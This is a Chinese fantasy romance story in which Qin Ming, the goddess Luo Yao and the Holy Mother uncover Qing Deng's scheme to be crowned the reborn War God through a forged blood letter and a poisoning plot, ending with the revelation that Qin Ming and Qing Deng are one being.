可事情远远不像我们所想的那样，我们万万没想到元婴会吞噬凡人的精魂，本以为可以借吸收元婴之气来救你娘，却因元婴反噬之力，使我们都深受其害。你娘不久便逝世了，紫衣仙人不辞而别，只留下了一句话：元婴现世，几世情缘；百年浩劫，父为子亡。 由于你的反噬之力，我的身体一天不如一天。然而，我答应了你娘，一定要把你抚养成人，因此我忍受着剧痛，就是要等到你成人之日。但我日夜都在担心，怕我撑不到那一天。秦铭，记住！一定要好好活着，我跟你娘会在天堂保护着你。 秦铭合上血书，他冷冷地笑着，神情恍惚，想哭就没了泪。他摇晃着走出大殿，圣母追向前去：“你要去哪？你刚刚伤愈，急需静养啊”，秦铭仍然摇晃地走着，全然不顾圣母的话。也许，此时任何的静养都无法愈合他心中的伤。 黑云压顶，大雨将至，似乎连上天都为此流泪。 淅淅沥沥的雨打在了秦铭身上，也打在了躲在一旁洛瑶的心上。秦铭拖着疲惫的身躯向殿外走去，雨浸透了他全身，洛瑶多少次都想上前留住他，可她害怕，害怕他会恨她一辈子。 紫金神殿内，圣母望着远去的秦铭，转头对着紫风说道：“没想到，他竟然是元婴之体，怪不得他受得了这摄魂之术。可怜他父亲，最终却不得不为他而亡啊。”紫风疑惑道：“那紫衣仙人所说的，百年浩劫，父为子亡，又是什么意思呢？”“依我看，他父亲应该也是元婴之体，传说当两个元婴面世，就会互相吸取对方的精元，直至一方死去。看来，他父亲是为了成全他而牺牲了自己啊”。 天渐渐地变暗，雨已停了，雨后的夜晚显得特别寒冷。秦铭裹着身体，摩擦着双手，口中直出冷气。秦铭僵硬的身体已经动弹不得，眼看不远处有道亮光，由远而至。秦铭连忙走上前去，不料却被脚下的石子拌着，连翻几个跟头，昏倒在那道光下。 睡梦中，秦铭听到了鸡啼声，缓缓睁开双眼，阳光异常刺眼。 一位老妇人端着一碗姜汤，走到秦铭面前，“小伙子，你醒啦！呐，这姜汤喝了吧！” 秦铭喝下姜汤，努力的回想昨日情景，“大娘，小生记得昨晚看到一道亮光，随后就昏倒了，今儿怎么在这了？” 老妇人笑了笑，接过汤碗，“昨晚，我老伴听到屋外有脚步声，就打着灯出去看，这不就看到你倒在地上。昨晚下过雨，想必你一定是冻着了吧！” 秦铭起身向老妇作揖，“大娘，多谢你的救命之恩，我秦铭真是无以为报啊。”秦铭心头些许感触。自从秦三离开他后，再没有人对他这么好了。 屋外传来缓慢的脚步声，老妇人起身望去，“是老头子回来了，他今早去打猎了，说是给你补补身子，不知道带回来什么？” 门外传来一阵脚步声，随后一位满脸胡塞的老人走进小屋，手中拿着几只野兔。秦铭未见其人就听闻其声了，“老伴，快来，今天逮了几只小东西，快拿去煮了，给小兄弟补补身。”老人放下猎物，看见秦铭已经苏醒，连忙走到他身边，“小兄弟，没事了吧，我姓徐，你就叫我老徐吧。我今天给你抓了好东西，待会吃了保证你痊愈。”老徐又对老伴说，“你去帮小兄弟找一套衣裳。” 秦铭看着这对老人，感动不已，他想起了秦三。“老徐，谢谢！”秦铭看着他们许久，他不知道该说些什么了。 老徐看了看他说道：“小兄弟，看你这身衣裳，你是参加完祭祀吧！”秦铭点了点头。“听说，祭祀那天出了大事，圣母都到了。当时一片混乱啊，你是怎么到了这里啊？这里离紫铭山顶可有些距离啊！”老徐疑惑地看着秦铭。 秦铭目光躲闪着，他不想让任何人知道，在紫铭山顶的事与他有关。“我和父母到这寻亲的，不想雾太大走散了。想必现在他们一定回了紫铭山顶，所以我要赶紧回去。”秦铭想回山顶看看秦三的尸体，把他带回家，即使只是尸骨。 老徐拍了拍秦铭的肩膀，“小兄弟，别担心，待会吃了东西我送你一程。”秦铭高兴得看着老徐，“二位的救命之恩我无以为报，待到我办完大事，定当来此相报。”说罢，秦铭向着老徐磕头。老徐连忙扶起秦铭，此时老妇端来了酒菜，三人把酒相欢，好不快乐。 午后，天气明朗，有着徐徐暖意。秦铭换好衣裳，在老徐的陪同下，告别了老妇，告别了小屋，继续踏上赶往紫铭山顶的道路。 战神再生是谁漫步在紫金神殿，刻下你月牙般的笑脸 天色渐渐转暗，秦铭独自一人行走在幽静的小路。此时他的心里只有一个念头，找到秦三的遗体，带回老家安葬，然后继续经营福记当铺，安安分分的过日子。 北岛的夜晚总是来得很快，不一会儿就伸手不见五指了。秦铭走到小路旁的一处空地，铺开老徐家带来的棉被，倒头就睡。看来他是真的累了，也许这一切来的太突然了。 夜暗的发寒，漆黑的世界，唯独高空中的明月散开了光晕。秦铭缓缓地站立起来，夜的黑已经无法让他感到恐惧，因为他已失去了至亲，心已经死了。秦铭看看四周，漆黑一片。周围寂静无声，只有风在他耳旁袭过。突然，他感到一阵窒息，像是有人掐住了他的脖子。秦铭挣扎着涨红了脸，绝望间他觉得自己就要死了，他仿佛看到了秦三。突然，秦铭开始用双手抵抗，他想到自己在没找到秦三的遗体之前还不能死。秦铭抓住那双黑暗中的黑手，也不知从哪来的力气，秦铭推开了他。 秦铭蹲下喘气，四周渐渐清晰。不远处一个模糊的影子向他靠近，秦铭眼睛不眨地盯着，他想知道是谁想下杀手。 眼前一个少年的轮廓渐渐清晰，在月光下十分阴冷。秦铭慢慢走近，眼睛一刻不离地望着他，因为他长的与秦铭无异，只是装束显得邪气。秦铭简直不敢相信自己的眼睛，定了定惊问道：“你…你…你到底是谁？为何要加害与我？” 少年的嘴角露出冷冷地笑，无声无息。他走近秦铭，一字一句地说：“我…就…是…你啊”话音刚落，他随着一阵风消失在秦铭的眼前。秦铭全身颤抖着，蹲下身子，双手捂住嘴。此时，秦铭的眼里只剩下恐惧，有太多的疑问在他心中，而且又是那么可怕。秦铭陷入无尽的恐惧，身体直冒冷汗。 温暖的阳光普照在秦铭身上，让他感觉一丝暖意。四周万物鸣叫，百花齐放，一切寓意着春天到了。秦铭在一阵吵闹声中醒来，看着四周他笑了，他是在庆幸昨晚只是一个噩梦而已。 而在此时，神魂殿内，殿主青灯盘膝而坐，双目紧闭。殿门开出一道亮光，迎面走来一个紫衣少女。“主人，血书已经成功交到秦铭手上。”紫衣少女跪下说道。“恩…不错，那个老不死的没起疑心吧?”青灯缓缓睁开双眼。“一切都如主人所料，洛瑶回到紫金神殿为秦铭疗伤，而圣母看了血书也没有起丝毫疑心，她现在已经认为秦铭就是元婴之体。”紫衣少女抬头说道。“哈哈…洛瑶啊洛瑶，我早知道你已经不再恨秦铭，也不会伤及他性命，既然如此我只有借你的手，让老东西误认为秦铭就是元婴，到时候我就能顺利成章的替代他，成为战神的再生。到那时，北岛城就落在我的手中了，啊哈哈……”青灯站起身子，放声大笑，响彻山谷。 “你赶快回到老东西身边，有任何情况，马上向我汇报”。 “是，主人”紫衣少女退出殿内，化身为一道光束，渐渐消失不见。 紫金神殿外，紫风推开殿们，走向殿内，对着圣母说道：“圣母，自从秦铭走后，女神就一直跟随着他，我们要不要……”。圣母摆了摆手，说道：“既然秦铭不是战神，就随他去吧。可是，我不明白竟然他不是战神，又为何与洛瑶有着千丝万缕的情缘？”。紫风转了转眼珠，身子凑近圣母说：“圣母，秦铭的外貌与当年的战神比如何？”圣母挪步说道：“分毫不差，以至于起初我也以为他就是战神啊”，紫风继续说：“就连圣母都误认为秦铭就是当年的战神将军，女神也不会例外吧。”圣母点了点头，“没错，真正的战神再生者又在哪呢？”。紫风贴近圣母，嘴对着圣母的耳朵说：“圣母，我们紫衣神族每年都举行祭祀仪式，不就是为了找出战神的转世吗？如今，众人已经目睹了秦铭被女神所伤，我们何不以找到战神再生为由，召集百姓到紫铭山顶，到时便可从中找出真正的战神。”圣母定了定神说：“对，我们一定要赶在洛瑶之前到达紫铭山顶，找出真正的战神。传我的口谕，召集北岛所有百姓，明日午时集会于紫铭山顶”。圣母转身走向殿外，遥望着远处的群山之巅。 黑风阵是谁相拥在清风之间，飞舞在蓝天下的依恋 离开紫金神殿已经数天，秦铭拖着疲惫的身躯来到了青灯岭。青灯岭是通往紫金山顶的必经之路，但也因为夜间常有青灯半浮山间，野兽哀嚎溪谷，被外界称为鬼岭。 刚过午后，青灯岭的天色已经渐渐暗沉下来，秦铭就近找了一片树林，倚靠在树下，静静地坐着。苍郁的绿树下蜷缩着一个瘦弱的孤影，秦铭眼中含着泪，脸上留下了斑驳的几处伤。秦铭拿出仅剩的干粮，啃咬间他开始哽咽，原本瘦弱的脸被涨地通红。 夜空中，漫天繁星闪烁着，秦铭抬头仰望着星空，寻找属于秦三的那一颗，在他萧瑟的眼眸中，尽是秦三微笑的脸庞。 霎时间，风起云涌，一团团黑云从夜空压向树林。只见半空中，一阵阵黑风旋转着呼啸在卷缩成一团的秦铭周围，到像是在打量他。秦铭顶着烈风，艰难地抬起头，看着不远处的团团黑风向自己逼近。秦铭尝试着站起身子，但剧烈的风，使他一次次狠狠地摔倒在地。眼看黑风离自己仅是一步之遥，秦铭赶忙紧闭双眼，双手使劲向外，试图抵挡黑风的侵袭。 不一会儿，周围没有了强烈的呼啸，显得异常的安静。秦铭放下伤痕累累的手，缓缓地睁开了双眼，没想到眼前却是一片黑暗，伸手不见五指。秦铭踉踉跄跄地站起身子，寻找着那片树林，还有头顶的星空。尽管没有了烈风，但此时的秦铭已经支撑不了他那伤痕累累的身躯，没走几步，他又摔倒在地，身上的血书被甩出，落在了秦铭的眼前。秦铭绝望地看着秦三留下的遗物，心中万念俱灰，他不明白原本平淡快乐的生活，为何转眼便是生死两茫茫。心如死灰的秦铭，手紧捏着血书，疲惫的双眼再也支撑不住。突然间，一道亮光闪过秦铭的眼眸，他迷迷糊糊地看着远处的一道黑影向自己走来，没等他看清，便又是无尽的黑暗。 洛瑶慌张地走到秦铭身旁，俯下身子查看他的伤势，随即拿出了丹药为他疗伤。半柱香后，秦铭躺在洛瑶的怀中，缓缓地睁开双眼，周围仍是无尽的黑暗，但眼前的女子却是光彩亮丽。秦铭看着眼前似曾相识的女子，乏力地说道：“我这是在哪？”洛瑶搀扶着秦铭，“这是黑风阵，我们必须赶紧离开”。 话音刚落，洛瑶挥动着手指，一条条紫色丝带将秦铭紧紧包裹住，随即化身为两道亮光直冲黑暗的尽头。当光明冲破黑暗，秦铭身上的丝带飘逸地飞回洛瑶身边。秦铭静静地望着不远处的那片黑暗，阵阵黑风旋转着组成的暗黑地带渐渐消失不见，出现在眼前的仍是那片树林，还有头顶的星空。 “秦铭，你没事吧？”洛瑶走近秦铭。“恩…我没事”秦铭转过头望着洛瑶，眼神恍惚不定，“你…是女神？”。“秦铭，你不记得我了吗？我…我是洛瑶啊！”洛瑶激动地扑向秦铭。“洛…瑶，洛瑶”，秦铭感觉一阵心如刀绞的痛，跪倒在地，痛苦地回想着熟悉而又陌生的那个人，那些光景。 迷茫的光晕渐渐散开，朱门外，少男摇曳着手中的纸扇。清风徐徐，蓝天下轻盈的风筝飞出深墙，落在了少男身旁。朱门内，少男走近身着高贵的少女，“小姐，小生秦铭，特来归还风筝”，少女微红着脸，轻声应道：“我…我叫洛瑶”。蓝天中随风舞动的风筝悠闲的翱翔，青草地上人们追逐着。秦铭拉着长线一直蔓延到天边，洛瑶犹如彩蝶般地追随。“秦铭，等等我，等等我！”洛瑶追赶着他，秦铭转过头“你来追我啊，我可要一直跑着，让你追我到天涯海角。”洛瑶停了下来，喘了口气，“好啊，你等着！”说罢便追身赶去。 “秦铭，你没事吧？”洛瑶摇晃着倒地的秦铭。秦铭看着眼前的女子，“我记得，洛瑶。”洛瑶眼中含着泪，与秦铭相拥而抱，“秦铭，太好了，你还记得我”。 不知不觉中风轻云淡，天色渐渐转亮，想必又度过了一个黑夜，黎明总归到来了。 神魂殿内，紫衣少女跪身说道：“主人，秦铭逃出了黑风阵，现在正赶往紫铭山顶。”青灯紧握着双拳，“一群废物，连一个凡人都困不住！”紫衣少女连忙上前“主人，原本秦铭已经身陷黑风阵，谁知洛瑶现身救了他”。青灯颤抖着身子，轻声念叨“洛瑶，看来血书还是骗不了你，那就别怪我无情了”，眼中充满了伤感，“紫风，你先回老东西身边，看来是时候出马了。” 一道道光束消失在殿内，留下的只有百年间的恩怨纠缠。 紫铭山顶骤然雪已灭，北岛的风没有落定终点 紫铭山顶尘埃落定，百姓听从圣母的号召，陆陆续续地赶往山顶，准备参拜战神。此时，天空中突然闪过一道青光，青灯降临山顶，幻化成百姓，混入人群。清风拂过山顶，吹动着凋零的叶，摇曳于蓝天下，缓缓飘向远方。 已在山脚的秦铭望着不远处飘来的落叶，片片落进他的心中，凋零着他与秦三的回忆。洛瑶看出了他的心事，握住他的手说：“你爹很爱你”。秦铭眼中含着泪，“是我害了他”，洛瑶上前紧紧抱住他说,“不，不是的。你爹的死与你无关，我们还是赶紧上山找到你爹的尸骨，到时你会明白的。”再次踏上上山之路，秦铭没有了当初的好奇，只是多了一份沉重。 穿过飘零的落叶，两道紫光降临山顶。紫风搀扶着圣母，俯瞰着拥挤的人群。 看见圣母降临，众人无不下跪参拜，唯独一位风度翩翩的少男摇着纸扇，嘴角散发出诡异的笑容。紫风纵身一跃，化成光束飞向他，瞬间一把利刃逼近他的胸前。紫风望着眼前的少男，露出了一丝微笑，眼看手中的利刃已近乎他的胸膛。“紫风！”随着一声叫喊，圣母已站立在少男的跟前，紫风见状迅速收起利刃。紫风走近少男：“大胆刁民，见了圣母，为何不跪拜！”，圣母面露笑容，“紫风，你看他是谁！”。紫风定睛望着眼前的少男，“你……你是秦铭？”，圣母摆了摆手说道：“不，他不是秦铭”。少男见状赶忙跪拜，“草民青灯，方才初见圣母威仪，乱了心神，忘了礼法，请求圣母发落”。紫风望着圣母说道：“圣母，难道他就是战神再生？”，圣母走近青灯，只见一道光起，飞入青灯的眼眸。 顿时风停云定，紫风静静地守候着被定格的青灯。此时，秦铭与洛瑶已赶到山顶，穿过拥挤的人群，两人来到紫风面前。紫风参见过洛瑶说道：“女神，秦铭乃是元婴之体，你怎么会跟他在一起？”。洛瑶走过紫风，望着定格的青灯，挥舞着手指，在她身后一根根柔软的丝带如同一把把锋利的长剑，直直逼向青灯。就在此时，从青灯的眼眸中飞出一道亮光，瞬间斩断了飞舞的丝带。圣母阴沉着脸，死死地盯着洛瑶：“怎么？上回没能杀死假战神，这次来杀真的战神了？”洛瑶冷笑道：“恐怕圣母是老眼昏花了吧，秦铭才是真正的战神再生。”随后转向紫风冷冷地说道：“紫风，秦三死前把血书交付于你，你可知他的尸骨现在何处啊？”。紫风低着头说道：“想必现在已存在于山间野兽的腹中了吧”。秦铭听完后，跪倒在地。 青灯回过神来，向紫风使了个眼色。紫风见机赶忙对着洛瑶说道：“女神，在你身边的是转世元婴，不信你可以问他自己。秦三自杀后，留下的那封血书便是最好的证明，什么战神，要我说就是害死自己父亲的害人精”。秦铭摸了摸胸中的血书，抽搐着低声说道“没错，我并不是什么战神转世，我……我只是一个杀害自己父亲的凶手”。说罢，秦铭擦拭着眼泪，转身跑开，洛瑶紧追其后。 风起云涌，圣母望着躁动的百姓，说道：“百年之前，战神将军为了北岛的安危，选择了牺牲自己。百年之后，战神将军再次重现人间，将重新担负起保卫北岛的重任，而他就是战神再生，青灯！”。话音一落，众生欢呼，纷纷下跪参拜战神。风轻云淡间，三人消失于紫铭山顶，光芒划破天际，飞向紫金神殿。 紫金神殿内，圣母笑着对青灯说道：“三日之后将会举行即位大典，你暂且居住在此好生休养，紫风会负责照顾你的起居。”青灯嘴角露出笑容，不紧不慢地说道：“多谢圣母!”。说罢，青灯回到自己房间，脱下人的外衣，冷笑道：“三日之后，北岛城就将落在我的手中，到时你们都得死，哈哈……”。就在此时，房门敲响，“谁！”青灯幻化人样，贴近房门。“战神将军，是我，紫风”，青灯匆匆打开房门，环顾四周，笑着对紫风说道，“紫风姑娘请进！”。 房内，青灯双手放在身后，站立在窗前。紫风跪拜在青灯身后笑着说道：“主人，如今圣母已对你没有丝毫戒心，即位战神看来已是定局。”青灯缓缓转过身子，搀扶起紫风，“紫风啊，多亏了你，我才能走到这一步，我不会亏待你的。不过为了万无一失，我还需要你为我做一件事。”紫风坚定地说道：“主人，我只求永远跟随主人左右，即使牺牲自己也在所不辞。”青灯抚摸着紫风的后背说道：“好！”随即从怀中拿出一个盒子，“这个盒子里面装的，是致命的毒药，我要你每日三次将其混入茶水之中，奉于圣母服用。三日之后，她必定死无葬身之地，到时北岛圣母非你莫属”听罢，紫风抖动了一下身躯，感到背后一阵寒意。她脸色苍白，匆忙将盒子塞入怀中起身离开。 走出房间，紫风踉跄地扶着墙壁走向圣母寝宫。她变得失魂落魄，为了青灯，她可以做任何事，甚至牺牲自己。为此，她欺骗了圣母，她违背自己的良知设计秦铭，为的并不是取代圣母，而只是想让青灯为她露出一丝微笑，哪怕只是一秒。慢步蹒跚至圣母寝宫，紫风望着她赖以成长的地方，回想起了当年自己被父母遗弃，如若不是圣母慈悲收留，恐怕早已横尸山野。圣母待她如同至亲，回望那些年的光景，紫风露出了微笑。 黑云压至，一阵寒风袭来，打破了紫风幸福的回望，等待他的是艰难的抉择。紫风面如死灰，快步走向圣母厢房，配置好毒药，准备伸手敲开房门。正在此时，一段段儿时幸福的回忆跳动在她脑海，她颤抖着缩回那双敲进地域之门的手。正当紫风准备转身离去时，房内传出圣母的呼唤，“紫风，是你吗？进来吧。” 紫风端着致命的毒药，推开了房门，膝跪在圣母面前说道：“圣母，这是紫风特意为您冲煮的长寿茶。”圣母起身接过热茶，流露出慈祥的笑容，“紫风啊，你有这份孝心，也不枉我把你抚养长大。” 紫风缓缓抬起头，望着圣母喝下自己亲手配置的毒药，嘴角是一丝冷冷的笑。此时，在紫风心中，儿时的幸福回忆早已被当年那个翩翩少男所取代。为此，她甘心为他做事，成为他监视圣母的棋子，为的只是博取他一个赞赏的目光或是一丝满意的微笑。 电闪雷鸣间，磅礴大雨敲击着紫金大地，洗礼下一片片尘埃，还有那些交错爱恨情仇。 即位大典骤然梦搁浅，情恨水的魔力依旧不变 三日之后，即位大典如期举行。议事大殿内，北岛国的代表们纷纷落位，等待着圣母的驾临。大殿之外，几十位紫衣仙子飞舞于蓝天下，环绕着大殿挥舞彩带。 “圣母驾到”。 紫风搀扶着圣母缓慢地走入议事大殿，众长老纷纷起身跪拜。圣母每走几步，便弯腰轻咳，一旁的紫风轻拂着圣母弯曲的后背。 “圣母为国操劳，一定要注意圣体啊” “圣母千秋万载，永生不灭” …… 顿时，议事大殿内议论四起。 圣母吃力地抬起右手，停顿几秒后，殿内又恢复了平静。“多谢各位的关心，我老婆子没这么容易倒下。”话音刚落，紫风凑近圣母耳朵说道，“圣母，吉时已到”。 “传青灯”。青灯恭恭敬敬地挪步殿内，站立于殿中。 “各位，我在此代表北岛各族，正式宣布，由青灯担任我们北岛国新一任的……”。 “等一等！”。殿内响起一声叫喊，洛瑶冲出人群，揭开面纱说道：“各位长老，殿上之人并非战神再生”，顿时殿内非议四起。 圣母瞬移至洛瑶面前，死死地看了她一眼后转身对众长老说道：“各位难道还不相信我的眼光吗！”，待到殿内恢复平静，对着洛瑶说道,“洛瑶啊洛瑶，你若再执迷不悟，就休怪我不顾情面了”。洛瑶走进人群，拉出蒙面男子，揭开其面纱，对着众长老说道：“他才是真正的战神再生”。 青灯望着秦铭嘿嘿笑着，“哪里来的妖孽，竟然敢冒充战神！”。看着与自己长得一模一样的青灯，秦铭心中寒意顿生，哆嗦着，“你…你才是…妖…妖孽”，两人四目相对，而众长老们更是疑云顿生。大殿之内，长老们指指点点着，议论声此起彼伏，场面混乱不堪。洛瑶趁机使出瞬移之术，双手挥动着变化出一把光芒四射的利剑，直直逼向青灯。 青灯眼看着洛瑶的利剑将要穿入自己的胸膛，但他却不能施法反抗，不然好不容易博取的信任，便会付之东流。在此千钧一发之时，一道紫光穿过洛瑶的胸膛，定格了她的身影。随即，鲜血从洛瑶胸口涌向嘴角，从嘴角喷向大殿。洛瑶摇晃着身体，憋住最后一口气，转身看着秦铭，耗尽全力从嘴角挤出两个字。秦铭眼看着洛瑶倒地前嘴角的那声：“快走！”，眼泪已淹没了眼眶，他没有听从洛瑶，而是跪地搂起她的身子，紧紧地抱着，即使被圣母扔下悬崖，他也不放开。 望着被抛入悬崖的洛瑶与秦铭，圣母狠狠地对众长老说道：“这就是不服从我的下场！现在我宣布，由青灯担任北岛国的战神，众位可有异议！”。长老们纷纷跪地磕头参拜。 “圣母英明，千秋万载，永生不灭！”。 “战神英武，一统四国，无人可挡！”。 青灯与紫风四目相望，殿内传出一声声长笑，伴随着阵阵礼炮齐鸣，响彻山谷。 圣母转身回宫，没走几步，一口鲜血喷涌而出，紫风连忙上前搀扶着。直至圣母寝宫，紫风端起最后一碗毒茶，走进圣母厢房。近至床前，看着卧病不起的圣母，紫风起了杀心，她端起毒茶，灌进了圣母嘴中。看着闭上双眼的圣母，她流着泪笑着，“最后一个障碍也替你除了，青灯，你终于可以安心主宰北岛，而我也能光明正大的陪伴在你左右”。 紫风想象着与青灯一起的幸福，百年前的初次相见，便沦陷于他的眼眸。百年间，为了能与青灯永生相伴，她不顾一切。现在，她终于完成了青灯的梦想，也是时候享受属于自己的那份幸福。她微笑着，突然胸口一阵剧痛，一把利刃从背后刺穿她的胸膛，鲜血直流。她用手拔出胸前的利刃，转身倚靠在床头，死死地望着眼前的蒙面男子。她瞥眼望着掉落在地的利刃，眼中含着泪，嘴角不停的重复着同一句话：“为什么是你？”，她睁大着眼，直至咽下最后一口气，也没有闭上，她想看清的不是面纱背后的脸，而且胸膛内的心。 望着死去的紫风，男子揭下了面纱，冷笑道：“紫风，你才是我最后一个障碍”。随后，化为一阵青风永远的消失在紫风的美梦之中，留下的只有悲凉。 圣母走到紫风尸骨跟前，用手轻拂紫风的眼睛，望着地上的泛着寒光的利刃，哀叹道：“万物皆有道，唯情无道。百年前，你赠与他的紫金宝剑，如今却成了夺你性命的凶器。而你一生爱着的人，却毁掉了你所有的幸福美梦”。说话间，圣母挥动着手指，随即幻化出无数的彩蝶，拖动着紫风的尸骨飞向远方。 望着远去的紫风，圣母凝重着脸，大战即将而至。 紫金神殿内，灯红酒绿，醉意已深的青灯摇晃着追逐着宫女，飘浮着的轻纱蒙住了他的眼睛。他一把抓住衣着裸露的宫女，紧紧地抱住，嘴里嘟囔着，“洛瑶，我是那么地爱你，可你的心里为何只有战神，我哪里比不上他，为了得到你的芳心，我幻化成他的模样，可最终你还是把我给忘了”。宫女们纷纷拿起酒杯，往青灯嘴里边灌边说，“将军，如今你已是一人之下，万人之上，何愁找不到一个心仪的女子”。此时，殿外走进一个身影，青灯摇晃着起身，眯着眼睛看着。他迷迷糊糊地听到：“青灯，本圣母驾到，为何还不跪见！”。待到青灯回过神来，他赶忙用内力逼出了体内的酒，看着眼前本应被紫风毒害死的圣母，乱了方寸。 “你……你不是已经死了吗？”青灯吃惊道。 “我只知道将要死的人是你！”。说话间，圣母双手挥舞着，半空中变化出无数的利剑，直直地飞着青灯。青灯见状立即双拳紧握，气运丹田，在身体周围制造出了强大的气墙。只见，一把把利剑没等触碰到青灯，便应声落地，被气墙挡在外面。正在这时，青灯身后的宫女开始运气，想趁其不备攻击他的后方。而狡猾的青灯，早已察觉到了背后的浓浓杀气。没等宫女动手，便先发制人，转身把宫女击倒于掌下。此时，宫女的易容之术随着青灯的掌力而消失，出现在他面前的是一张熟悉的脸。“洛瑶，原来你没死”，青灯望着身受重伤的洛瑶大声叫到，“你们一个个装死骗我，好，那我就亲手送你们上西天”。青灯运气于掌心，准备击向洛瑶，正在此时，秦铭冲进神殿，挡在洛瑶身前。青灯见状，冷笑道，“你一个小小的凡人，还想保护她，当年你没能保护你心爱的女人，没能保住整个北岛，现在也一样”。说完便起掌相击，没等掌锋伤及秦铭，青灯的一口鲜血便喷涌而出。“青灯，你已中了蚀心虫毒，方才你一运气，便已毒气攻心。”洛瑶冷笑道。青灯望着酒杯哀道：“酒中有毒！你……你们设下圈套，就是为了引我上钩，待我放松警惕后置我于死地。呵呵……想不到我到头来还是自作自受。可我不甘心，你们是怎么看破我的计划？难道是紫风，她出卖了我！”。 “不！紫风从头到尾都没有出卖过你，她一心一意为你，她也确实在茶中下了毒，但我早已察觉她是你的人，所以她奉茶是真，而我喝茶是假。”圣母说道。 “当初在紫铭山顶，我察觉到了你的存在，也察觉到了秦铭。我便与圣母合作，让你误以为秦铭中了摄魂术。起初我们并不知道你的计划，直到你利用紫风让我们看到了血书，我们才知道你是想利用血书，让我们以为秦铭并非战神，并让秦铭在害死自己父亲的阴影中含泪而终。在与圣母商议后，我们决定将计就计，制造我与圣母的矛盾，在你骗取圣母的信任后，我就假死在圣母手上。我们知道，只有我们两个都死了，你才会放松警惕，我们才有机会下手。”洛瑶倚靠在墙角笑着说道。 “原来你们一早就识破了我的计划，可是……可是紫风是你一手带大的，难道你一直都不信任她？”，青灯跪倒在地，强忍着蚀心的苦痛。 圣母定了定神，望着窗外，“不，紫风是我一手带大的，我待她如同至亲，我对她从没有戒心，也很了解她。不过，也正是因为太了解她，所以她所说的每一句我都清楚是真是假。我一直没揭穿她，一方面是想借着她看清你的计划，另一方面也是希望她能早日回头。然而，她头也不回地走向她认为的天堂，没想到的是，天堂之门背后的却是无间的炼狱”。 青灯干涩的眼眸开始湿润，他感到无比的心痛，蚀心虫一点点地咀嚼着他的心。他不知道，在他的心中，不止住着洛瑶，更住着紫风。他从没有像现在这样痛苦，因为他开始知道心痛。那种痛并不是万虫蚀心之痛，而是失去至爱之痛。 挣扎在死亡的边缘，青灯用尽最后一丝真气，幻化成一道青光，消失在远方。 城外，望着空中成群飞舞的彩蝶，青灯追逐而上。顿时，彩蝶散开，青灯望着彩蝶之中的紫风，露出了微笑，紧紧地将她拥在怀中。瞬时，飞舞的彩蝶伴随着两道彩光消失于蓝天下。 殿内，秦铭紧按着自己的胸口，他感到胸内有一股气流即将澎涌而出，疼痛难忍。望着因疼痛而倒地的秦铭，洛瑶立即上前为他活血运气。然而，秦铭的疼痛并没有减轻，反而越演越烈。洛瑶紧抱着已奄奄一息的秦铭，哭喊着，“秦铭，不，你不可以离开我。百年前，我们没能在一起，百年后，你为何又要离我而去”。 圣母走近洛瑶跟前，无奈地说道：“洛瑶，他……他不是战神”。洛瑶眼含着泪，望着圣母吃惊地说道：“你说什么？他怎么可能不是战神，我不会认错的，他就是战神”。圣母叹了口气，说道：“他是青灯，而青灯也是他，他们原本就是一个人。话说，百年之前，掌管天庭九灯的灯神，因私自下凡，留恋红尘，震怒了上天，因此被贬为凡人。可是，没想到的是，灯神因为不满上天的惩戒，逃离了肉身，万年修道，一念成魔，而他的肉身便落入凡间轮回转世，也就是你眼前的秦铭。天帝知道后，为了惩戒他，将他与肉体双双化为元婴，并且彼此不知道对方的身世，直至自相残杀而死。如今，青灯已死，他也就不免化为尘土，消失于世上”。洛瑶抖动着身子，哭喊着：“不，不可能的，那我的战神呢？他去了哪？”。圣母说道：“战神只是凡人，遭遇百年浩劫后便消失于六道轮回，不会再出现了”。 洛瑶抱着怀中的秦铭，撕心裂肺地哭喊。她脑海中那条尘封的记忆线，散发着微光，也许就要苏醒。圣母走向殿外，抬头仰望着蓝天，她深深地吸了一口气，随后缓缓吐出。一切即将尘埃落定，时间可以忘记仇恨，却忘不了你所爱的人。 百年爱恨叶落下了思念，风摇曳那些岁岁年年 紫风望着圣母说道：“圣母，难道他就是战神再生？”，圣母走近青灯，只见一道光起，飞入青灯的眼眸，穿过青灯的记忆，圣母看到了那些年的光景。 万年修道成仙的青灯，私自下凡，幻化成人间的灯火，观望着人间的一切。 元宵佳节，穿越渭河上的古桥，青灯幻化成了少男手中的灯火。桥上，洛瑶看着河水中的星点亮光，在绚烂的夜空下翩翩起舞。初降人间的青灯，望着她翩翩的舞姿，微红的脸颊，每一颦一簇都深深地烙在他的心上。古桥上，望着远去的洛瑶，少男仍然站在原地，闻了闻手中残留的香味，露出了微笑。而在此时，少男手中的灯火窜动，看着眼前的少男，青灯飞离了灯火，幻化成少男的模样。 转眼朱门内，幻化为少男的青灯，摇曳着手中的纸扇。清风徐徐下，青灯化名秦铭，与洛瑶追逐于蓝天下。蓝天中随风舞动的风筝悠闲的翱翔，青草地上洛瑶追逐着秦铭，蔓延爱的痕迹。 目光转向紫金神殿内，圣母指着身旁的少男，对洛瑶说道：“洛瑶啊，他即将成为我们北岛国的战神，为了能更好的治理北岛，为了我们北岛的未来，我决定将你许配于他，你说好吗？”。望着眼前的少男，洛瑶知道是他，元宵佳节上的初见，朱门内的相识，草原上的奔跑，都是他，秦铭。洛瑶点了点头，红着脸跑向殿外。 然而，交错百年的爱恨情仇，正从此刻开始蔓延。夜空中无数的烟花绽放，老树下少男紧紧地搂着洛瑶，绚丽的烟花瞬间落幕，幻化成永世的缠绵。渭河倒映着爱的痕迹，一阵涟漪，渐渐散开。此时的青灯幻化成人间烟火，看着眼前的少男，看着少男怀中的洛瑶，他满目悲伤。正当洛瑶与战神的大婚宴上，青灯幻化成人形，强行冲进殿内，只是希望能告诉洛瑶真相。然而，面对着强大的紫衣族人，面对北岛的圣母，青灯铩羽而归。一气之下，青灯联合其余三国，攻打北岛，为的只是证明自己的能力强于战神，而自己才是洛瑶真正爱的人。突如其来的战争使得北岛生灵涂炭，血流成河，民生的哀悼响彻天地间。天帝得知后，大发雷霆，派遣天兵天将捉拿青灯，而此时的洛瑶得知青灯才是秦铭后，痛苦不已。 紫金神殿内，圣母尘封了洛瑶与青灯之间的记忆，留下的只有她与战神的片段，只有如此，才能维护北岛的声誉，才能减轻洛瑶的痛苦。为了使北岛的百姓随着时间的流逝渐渐遗忘这段孽缘，圣母不惜编造出百年浩劫，而情恨水也只是用来尘封洛瑶对青灯的那段记忆。 青灯被贬下凡间，永受轮回之苦，而洛瑶封闭了对青灯的记忆之门。一切看似尘埃落定，百年爱恨也随流消逝，不变的只有泛着银光永无止尽的雪，掩盖着百年的记忆。 …… 